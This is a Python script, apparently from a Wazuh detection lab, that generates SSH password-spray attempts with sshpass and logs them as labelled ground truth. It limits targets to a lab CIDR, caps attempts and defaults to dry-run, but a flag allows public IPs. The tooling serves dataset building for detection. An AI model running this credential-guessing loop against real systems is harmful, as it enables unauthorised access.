#!/usr/bin/env python3
"""
SSH Brute Force / Password Spray Simulator for Wazuh Dataset Lab
Generates failed SSH login attempts that trigger Wazuh built-in rules (5710, 5712, 5716)
MITRE: T1110.001 (Password Guessing)
"""
import argparse
import ipaddress
import json
import shutil
import subprocess
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path


def now_utc():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def require_lab_ip(target, lab_cidr, allow_public=False):
    ip = ipaddress.ip_address(target)
    net = ipaddress.ip_network(lab_cidr, strict=False)
    if ip not in net:
        raise SystemExit(f"[BLOCKED] Target {target} di luar LAB_CIDR {lab_cidr}")
    if not ip.is_private and not allow_public:
        raise SystemExit(f"[BLOCKED] Target {target} bukan private IP (use --allow-public-ip to override)")
    return str(ip)


def read_lines(path):
    return [
        x.strip()
        for x in Path(path).read_text(encoding="utf-8").splitlines()
        if x.strip() and not x.strip().startswith("#")
    ]


def write_jsonl(path, record):
    p = Path(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    with p.open("a", encoding="utf-8") as f:
        f.write(json.dumps(record, ensure_ascii=False) + "\n")


def write_ground_truth(record, ground_truth_path):
    """Write ground truth record using the same format as write_custom_pentest_log.py"""
    write_jsonl(ground_truth_path, record)


def main():
    parser = argparse.ArgumentParser(description="SSH Brute Force / Password Spray Simulator for Wazuh Dataset Lab")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("--lab-cidr", default="10.0.0.0/16", help="Lab CIDR range")
    parser.add_argument("--users", default="payloads/dummy_users.txt", help="File with usernames")
    parser.add_argument("--passwords", default="payloads/dummy_passwords.txt", help="File with passwords")
    parser.add_argument("--max-attempts", type=int, default=10, help="Maximum login attempts (1-20)")
    parser.add_argument("--interval", type=float, default=2.0, help="Interval between attempts (seconds, min 2)")
    parser.add_argument("--timeout", type=int, default=6, help="SSH connection timeout")
    parser.add_argument("--execute", action="store_true", help="Execute real attempts (default: dry-run)")
    parser.add_argument("--ground-truth", default="ground-truth/ssh_brute_force.jsonl", help="Ground truth output path")
    parser.add_argument("--log-dir", default="logs/auth/ssh_brute_force", help="Log directory")
    parser.add_argument("--allow-public-ip", action="store_true", help="Allow non-private IPs (for lab environments)")
    args = parser.parse_args()

    target = require_lab_ip(args.target, args.lab_cidr, args.allow_public_ip)

    if args.max_attempts < 1 or args.max_attempts > 20:
        raise SystemExit("[BLOCKED] max-attempts harus 1..20")
    if args.interval < 2:
        raise SystemExit("[BLOCKED] interval minimal 2 detik")
    if shutil.which("sshpass") is None:
        raise SystemExit("[ERROR] sshpass tidak ditemukan. Install: sudo apt install -y sshpass")

    users = read_lines(args.users)
    passwords = read_lines(args.passwords)

    run_id = "run-" + uuid.uuid4().hex[:12]
    outdir = Path(args.log_dir) / run_id
    outdir.mkdir(parents=True, exist_ok=True)

    attempts = []
    count = 0

    # Password spray: try each password against each user, or rotate
    for user in users:
        for password in passwords:
            if count >= args.max_attempts:
                break
            count += 1
            start = now_utc()

            cmd = [
                "sshpass", "-p", password,
                "ssh",
                "-p", str(args.port),
                "-o", "PreferredAuthentications=password",
                "-o", "PubkeyAuthentication=no",
                "-o", "StrictHostKeyChecking=no",
                "-o", f"ConnectTimeout={args.timeout}",
                f"{user}@{target}",
                "true"
            ]

            record = {
                "timestamp": start,
                "run_id": run_id,
                "scenario_id": f"ssh_brute_force_{count:03d}",
                "attack_type": "ssh_brute_force",
                "mitre_tactic": "Credential Access",
                "mitre_technique": "T1110.001",
                "target_host": target,
                "target_port": args.port,
                "tool": "sshpass+ssh",
                "payload_id": f"ssh_spray_{count}",
                "intensity": "burst" if args.max_attempts > 10 else "low",
                "expected_label": "malicious",
                "success_status": "unknown",
                "username": user,
                "password_type": "dummy_lab_only",
                "attempt_number": count,
                "dry_run": not args.execute,
                "safety_status": "lab_only"
            }

            if args.execute:
                proc = subprocess.run(cmd, text=True, capture_output=True, timeout=args.timeout + 3)
                record["success_status"] = "failed" if proc.returncode != 0 else "unexpected_success"
                record["return_code"] = proc.returncode
                (outdir / f"attempt-{count:03d}.stderr.log").write_text(proc.stderr, encoding="utf-8", errors="replace")
                (outdir / f"attempt-{count:03d}.stdout.log").write_text(proc.stdout, encoding="utf-8", errors="replace")
            else:
                record["success_status"] = "dry_run"

            write_ground_truth(record, args.ground_truth)
            attempts.append(record)
            print(json.dumps(record, ensure_ascii=False))

            if count < args.max_attempts:
                time.sleep(args.interval)

            if count >= args.max_attempts:
                break

    summary = {
        "run_id": run_id,
        "target": target,
        "scenario": "ssh_brute_force",
        "attempts": len(attempts),
        "execute": args.execute,
        "ground_truth": args.ground_truth,
        "log_dir": str(outdir)
    }
    (outdir / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")

    print(json.dumps(summary, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
